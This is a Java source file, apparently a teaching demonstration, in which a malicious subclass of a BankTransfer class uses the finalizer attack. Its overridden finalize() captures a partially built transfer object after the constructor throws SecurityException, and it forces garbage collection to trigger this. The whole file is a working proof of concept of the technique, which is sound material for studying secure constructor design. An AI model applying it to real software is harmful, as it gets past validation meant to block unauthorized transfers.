/**
 * EXPLOIT: GhostTransferExploit
 * Malicious subclass that uses the Finalizer Attack to capture unauthorized
 * objects.
 */
public class GhostTransferExploit extends BankTransfer {
    public static BankTransfer capturedGhost;

    public GhostTransferExploit(String memo, int amount) {
        // super must be the first statement. It will throw SecurityException.
        super(memo, amount);
    }

    /**
     * The finalize method is called by the JVM before garbage collecting the
     * object.
     * Even if the constructor failed (threw an exception), finalize() is still
     * invoked.
     */
    @Override
    protected void finalize() {
        System.out.println("Exploit: finalize() called! Capturing the 'Ghost' object...");
        // Capturing the reference to the partially initialized object!
        capturedGhost = this;
    }

    @SuppressWarnings("deprecation")
    public static void runAttack() {
        try {
            new GhostTransferExploit("GHOST-FUNDS", 1000000);
        } catch (SecurityException e) {
            System.out.println("Exploit: Caught expected SecurityException from constructor.");
        }

        // Triggering GC to call finalize()
        System.out.println("Exploit: Triggering Garbage Collection to activate finalizer...");
        for (int i = 0; i < 5; i++) {
            System.gc();
            System.runFinalization();
            try {
                Thread.sleep(100);
            } catch (InterruptedException e) {
            }
        }
    }
}
